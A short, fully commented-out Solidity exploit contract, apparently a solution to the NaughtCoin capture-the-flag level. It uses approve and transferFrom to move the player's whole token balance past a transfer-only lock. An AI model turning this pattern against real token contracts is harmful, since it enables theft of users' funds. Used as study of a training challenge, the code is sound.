// // SPDX-License-Identifier: MIT
// pragma solidity ^0.8.18;

// // import "openzeppelin/contracts/token/ERC20/ERC20.sol";

// interface NaughtCoin {
//     function transferFrom(address, address, uint) external;

//     function approve(address, uint) external;

//     function player() external view returns (address);

//     function balanceOf(address) external view returns (uint256);
// }

// contract Hack {
//     NaughtCoin naughtCoin;

//     constructor(address chal) {
//         naughtCoin = NaughtCoin(chal);
//     }

//     function SolidityBuild() public {
//         address player = naughtCoin.player();
//         uint256 balance = naughtCoin.balanceOf(player);
//         naughtCoin.approve(address(this), balance);
//         naughtCoin.transferFrom(player, address(this), balance);
//     }
// }
